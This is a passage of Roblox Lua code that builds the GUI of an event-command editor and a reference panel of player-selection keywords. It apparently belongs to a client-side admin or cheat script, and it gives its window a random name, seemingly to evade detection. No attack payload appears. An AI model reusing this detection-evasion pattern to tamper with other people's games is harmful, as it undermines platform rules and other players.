			{45,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Name="Add",Parent={44},Position=UDim2.new(0,0,1,-20),Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{46,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={45},PlaceholderColor3=Color3.new(0.7843137383461,0.7843137383461,0.7843137383461),PlaceholderText="Add new command",Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-10,1,0),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{47,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={44},Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
			{48,"UIListLayout",{Parent={47},SortOrder=2,}},
			{49,"Frame",{currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="CmdTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
			{50,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={49},PlaceholderColor3=Color3.new(1,1,1),Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-45,0,20),Text="a\\b\\c\\d",TextColor3=currentText1,TextSize=14,TextXAlignment=0,ZIndex=10,}},
			{51,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Delete",Parent={49},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="X",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{52,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Settings",Parent={49},Position=UDim2.new(1,-40,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
			{53,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://1204397029",Parent={52},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),ZIndex=10,}},
		})
		main.Name = randomString()
		local mainFrame = main:WaitForChild("Content")
		local eventList = mainFrame:WaitForChild("List")
		local eventListHolder = eventList:WaitForChild("Holder")
		local cmdTemplate = mainFrame:WaitForChild("CmdTemplate")
		local eventTemplate = mainFrame:WaitForChild("EventTemplate")
		local settingsFrame = mainFrame:WaitForChild("Settings"):WaitForChild("Slider")
		local settingsTemplates = mainFrame.Settings:WaitForChild("Templates")
		local settingsList = settingsFrame:WaitForChild("List"):WaitForChild("Holder")
		table.insert(shade2,main.TopBar) table.insert(shade1,mainFrame) table.insert(shade2,eventTemplate)
		table.insert(text1,eventTemplate.EventName) table.insert(shade1,eventTemplate.Cmds.Add) table.insert(shade1,cmdTemplate)
		table.insert(text1,cmdTemplate.TextBox) table.insert(shade2,cmdTemplate.Delete) table.insert(shade2,cmdTemplate.Settings)
		table.insert(scroll,mainFrame.List) table.insert(shade1,settingsFrame) table.insert(shade2,settingsFrame.Line)
		table.insert(shade2,settingsFrame.Close) table.insert(scroll,settingsFrame.List) table.insert(shade2,settingsTemplates.DelayEditor.Secs)
		table.insert(text1,settingsTemplates.DelayEditor.Secs) table.insert(text1,settingsTemplates.DelayEditor.Secs.Label) table.insert(text1,settingsTemplates.Players.Title)
		table.insert(shade3,settingsTemplates.Players.CustomButton) table.insert(shade2,settingsTemplates.Players.Custom) table.insert(text1,settingsTemplates.Players.Custom)
		table.insert(shade3,settingsTemplates.Players.Any.Button) table.insert(shade3,settingsTemplates.Players.Me.Button) table.insert(text1,settingsTemplates.Players.Any)
		table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Strings.Title) table.insert(text1,settingsTemplates.Strings.Any)
		table.insert(shade3,settingsTemplates.Strings.Any.Button) table.insert(shade3,settingsTemplates.Strings.CustomButton) table.insert(text1,settingsTemplates.Strings.Custom)
		table.insert(shade2,settingsTemplates.Strings.Custom)
		table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Numbers.Title) table.insert(text1,settingsTemplates.Numbers.Any)
		table.insert(shade3,settingsTemplates.Numbers.Any.Button) table.insert(shade3,settingsTemplates.Numbers.CustomButton) table.insert(text1,settingsTemplates.Numbers.Custom)
		table.insert(shade2,settingsTemplates.Numbers.Custom)

		local tweenInf = TweenInfo.new(0.25,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)

		local currentlyEditingCmd = nil

		settingsFrame:WaitForChild("Close").MouseButton1Click:Connect(function()
			settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
		end)

		local function resizeList()
			local size = 0

			for i,v in pairs(eventListHolder:GetChildren()) do
				if v.Name == "EventTemplate" then
					size = size + 20
					if v.Expand.Rotation == 90 then
						size = size + 20*(1+(#events[v.EventName:GetAttribute("RawName")].commands or 0))
					end
				end
			end

			TweenService:Create(eventList,tweenInf,{CanvasSize = UDim2.new(0,0,0,size)}):Play()

			if size > eventList.AbsoluteSize.Y then
				eventListHolder.Size = UDim2.new(1,-8,1,0)
			else
				eventListHolder.Size = UDim2.new(1,0,1,0)
			end
		end

		local function resizeSettingsList()
			local size = 0

			for i,v in pairs(settingsList:GetChildren()) do
				if v:IsA("Frame") then
					size = size + v.AbsoluteSize.Y
				end
			end

			settingsList.Parent.CanvasSize = UDim2.new(0,0,0,size)

			if size > settingsList.Parent.AbsoluteSize.Y then
				settingsList.Size = UDim2.new(1,-8,1,0)
			else
				settingsList.Size = UDim2.new(1,0,1,0)
			end
		end

		local function setupCheckbox(button,callback)
			local enabled = button.On.BackgroundTransparency == 0

			local function update()
				button.On.BackgroundTransparency = (enabled and 0 or 1)
			end

			button.On.MouseButton1Click:Connect(function()
				enabled = not enabled
				update()
				if callback then callback(enabled) end
			end)

			return {
				Toggle = function(nocall) enabled = not enabled update() if not nocall and callback then callback(enabled) end end,
				Enable = function(nocall) if enabled then return end enabled = true update()if not nocall and callback then callback(enabled) end end,
				Disable = function(nocall) if not enabled then return end enabled = false update()if not nocall and callback then callback(enabled) end end,
				IsEnabled = function() return enabled end
			}
		end

		local function openSettingsEditor(event,cmd)
			currentlyEditingCmd = cmd

			for i,v in pairs(settingsList:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

			local delayEditor = settingsTemplates.DelayEditor:Clone()
			delayEditor.Secs.FocusLost:Connect(function()
				cmd[3] = tonumber(delayEditor.Secs.Text) or 0
				delayEditor.Secs.Text = cmd[3]
				if onEdited then onEdited() end
			end)
			delayEditor.Secs.Text = cmd[3]
			delayEditor.Visible = true
			table.insert(shade2,delayEditor.Secs)
			table.insert(text1,delayEditor.Secs)
			table.insert(text1,delayEditor.Secs.Label)
			delayEditor.Parent = settingsList

			for i,v in pairs(event.sets) do
				if v.Type == "Player" then
					local template = settingsTemplates.Players:Clone()
					template.Title.Text = v.Name or "Player"

					local me,any,custom

					me = setupCheckbox(template.Me.Button,function(on)
						if not on then return end
						any.Disable()
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						me.Disable()
						custom.Disable()
						cmd[2][i] = 1
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						me.Disable()
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						if custom:IsEnabled() then
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						me:Enable()
					elseif cVal == 1 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(shade3,template.CustomButton)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.Me.Button)
					table.insert(text1,template.Any)
					table.insert(text1,template.Me)
					template.Parent = settingsList
				elseif v.Type == "String" then
					local template = settingsTemplates.Strings:Clone()
					template.Title.Text = v.Name or "String"

					local any,custom

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						if custom:IsEnabled() then
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(text1,template.Any)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.CustomButton)
					template.Parent = settingsList
				elseif v.Type == "Number" then
					local template = settingsTemplates.Numbers:Clone()
					template.Title.Text = v.Name or "Number"

					local any,custom

					any = setupCheckbox(template.Any.Button,function(on)
						if not on then return end
						custom.Disable()
						cmd[2][i] = 0
						if onEdited then onEdited() end
					end)

					local customTextBox = template.Custom
					custom = setupCheckbox(template.CustomButton,function(on)
						if not on then return end
						any.Disable()
						cmd[2][i] = customTextBox.Text
						if onEdited then onEdited() end
					end)

					ViewportTextBox.convert(customTextBox)
					customTextBox.FocusLost:Connect(function()
						cmd[2][i] = tonumber(customTextBox.Text) or 0
						customTextBox.Text = cmd[2][i]
						if custom:IsEnabled() then
							if onEdited then onEdited() end
						end
					end)

					local cVal = cmd[2][i]
					if cVal == 0 then
						any:Enable()
					else
						custom:Enable()
						customTextBox.Text = cVal
					end

					template.Visible = true
					table.insert(text1,template.Title)
					table.insert(text1,template.Any)
					table.insert(shade3,template.Any.Button)
					table.insert(shade3,template.CustomButton)
					template.Parent = settingsList
				end
			end
			resizeSettingsList()
			settingsFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
		end

		local function defaultSettings(ev)
			local res = {}

			for i,v in pairs(ev.sets) do
				if v.Type == "Player" then
					res[#res+1] = v.Default or 0
				elseif v.Type == "String" then
					res[#res+1] = v.Default or 0
				elseif v.Type == "Number" then
					res[#res+1] = v.Default or 0
				end
			end

			return res
		end

		local function refreshList()
			for i,v in pairs(eventListHolder:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end

			for name,event in pairs(events) do
				local eventF = eventTemplate:Clone()
				eventF.EventName.Text = name
				eventF.Visible = true
				eventF.EventName:SetAttribute("RawName", name)
				table.insert(shade2,eventF)
				table.insert(text1,eventF.EventName)
				table.insert(shade1,eventF.Cmds.Add)

				local expanded = false
				eventF.Expand.MouseButton1Down:Connect(function()
					expanded = not expanded
					eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					eventF.Expand.Rotation = expanded and 90 or 0
					resizeList()
				end)

				local function refreshCommands()
					for i,v in pairs(eventF.Cmds.Holder:GetChildren()) do
						if v.Name == "CmdTemplate" then
							v:Destroy()
						end
					end

					eventF.EventName.Text = name..(#event.commands > 0 and " ("..#event.commands..")" or "")

					for i,cmd in pairs(event.commands) do
						local cmdF = cmdTemplate:Clone()
						local cmdTextBox = cmdF.TextBox
						ViewportTextBox.convert(cmdTextBox)
						cmdTextBox.Text = cmd[1]
						cmdF.Visible = true
						table.insert(shade1,cmdF)
						table.insert(shade2,cmdF.Delete)
						table.insert(shade2,cmdF.Settings)

						cmdTextBox.FocusLost:Connect(function()
							event.commands[i] = {cmdTextBox.Text,cmd[2],cmd[3]}
							if onEdited then onEdited() end
						end)

						cmdF.Settings.MouseButton1Click:Connect(function()
							openSettingsEditor(event,cmd)
						end)

						cmdF.Delete.MouseButton1Click:Connect(function()
							table.remove(event.commands,i)
							refreshCommands()
							resizeList()

							if currentlyEditingCmd == cmd then
								settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
							end
							if onEdited then onEdited() end
						end)

						cmdF.Parent = eventF.Cmds.Holder
					end

					eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
				end

				local newBox = eventF.Cmds.Add.TextBox
				ViewportTextBox.convert(newBox)
				newBox.FocusLost:Connect(function(enter)
					if enter then
						event.commands[#event.commands+1] = {newBox.Text,defaultSettings(event),0}
						newBox.Text = ""

						refreshCommands()
						resizeList()
						if onEdited then onEdited() end
					end
				end)

				--eventF:GetPropertyChangedSignal("AbsoluteSize"):Connect(resizeList)

				eventF.Parent = eventListHolder

				refreshCommands()
			end

			resizeList()
		end

		local function saveData()
			local result = {}
			for i,v in pairs(events) do
				result[i] = v.commands
			end
			return HttpService:JSONEncode(result)
		end

		local function loadData(str)
			local data = HttpService:JSONDecode(str)
			for i,v in pairs(data) do
				if events[i] then
					events[i].commands = v
				end
			end
		end

		local function addCmd(event,data)
			table.insert(events[event].commands,data)
		end

		local function setOnEdited(f)
			if type(f) == "function" then
				onEdited = f
			end
		end

		main.TopBar.Close.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-175,0,-500), "InOut", "Quart", 0.5, true, nil)
		end)
		dragGUI(main)
		main.Parent = PARENT

		return {
			RegisterEvent = registerEvent,
			FireEvent = fireEvent,
			Refresh = refreshList,
			SaveData = saveData,
			LoadData = loadData,
			AddCmd = addCmd,
			Frame = main,
			SetOnEdited = setOnEdited
		}
	end)()

	reference = (function()
		local main = create({
			{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="Main",Position=UDim2.new(0.5,-250,0,-500),Size=UDim2.new(0,500,0,20),ZIndex=10,}},
			{2,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
			{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Size=UDim2.new(1,0,0.94999998807907,0),Text="Reference",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
			{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image="rbxassetid://5054663650",Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
			{6,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,300),ZIndex=10,}},
			{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,1313),Name="List",Parent={6},ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,0),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",VerticalScrollBarInset=2,ZIndex=10,}},
			{8,"UIListLayout",{Parent={7},SortOrder=2,}},
			{9,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,429),ZIndex=10,}},
			{10,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={9},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Special Player Cases",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{11,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={9},Position=UDim2.new(0,8,0,25),Size=UDim2.new(1,-8,0,20),Text="These keywords can be used to quickly select groups of players in commands:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{12,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={9},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{13,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Cases",Parent={9},Position=UDim2.new(0,8,0,55),Size=UDim2.new(1,-16,0,342),ZIndex=10,}},
			{14,"UIListLayout",{Parent={13},SortOrder=2,}},
			{15,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-4,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={15},Size=UDim2.new(1,0,1,0),Text="all",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{17,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={15},Position=UDim2.new(0,15,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{18,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-3,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{19,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={18},Size=UDim2.new(1,0,1,0),Text="others",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={18},Position=UDim2.new(0,37,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone except you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{21,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-2,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{22,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={21},Size=UDim2.new(1,0,1,0),Text="me",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{23,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={21},Position=UDim2.new(0,19,0,0),Size=UDim2.new(1,0,1,0),Text="- includes your player only",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{24,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{25,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={24},Size=UDim2.new(1,0,1,0),Text="#[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{26,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={24},Position=UDim2.new(0,59,0,0),Size=UDim2.new(1,0,1,0),Text="- gets a specified amount of random players",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{27,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{28,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={27},Size=UDim2.new(1,0,1,0),Text="random",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{29,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={27},Position=UDim2.new(0,44,0,0),Size=UDim2.new(1,0,1,0),Text="- affects a random player",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{30,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={30},Size=UDim2.new(1,0,1,0),Text="%[team name]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{32,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={30},Position=UDim2.new(0,78,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone on a given team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{33,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{34,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={33},Size=UDim2.new(1,0,1,0),Text="allies / team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{35,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={33},Position=UDim2.new(0,63,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{36,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{37,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={36},Size=UDim2.new(1,0,1,0),Text="enemies / nonteam",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{38,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={36},Position=UDim2.new(0,101,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are not on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{39,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{40,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={39},Size=UDim2.new(1,0,1,0),Text="friends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{41,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={39},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{42,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{43,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={42},Size=UDim2.new(1,0,1,0),Text="nonfriends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{44,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={42},Position=UDim2.new(0,61,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is not friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{45,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{46,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={45},Size=UDim2.new(1,0,1,0),Text="guests",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{47,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={45},Position=UDim2.new(0,36,0,0),Size=UDim2.new(1,0,1,0),Text="- guest players (obsolete)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{48,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{49,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={48},Size=UDim2.new(1,0,1,0),Text="bacons",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{50,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={48},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone with the \"bacon\" or pal hair",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{51,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{52,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={51},Size=UDim2.new(1,0,1,0),Text="age[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{53,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={51},Position=UDim2.new(0,71,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone below or at the given age",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{54,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={54},Size=UDim2.new(1,0,1,0),Text="rad[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
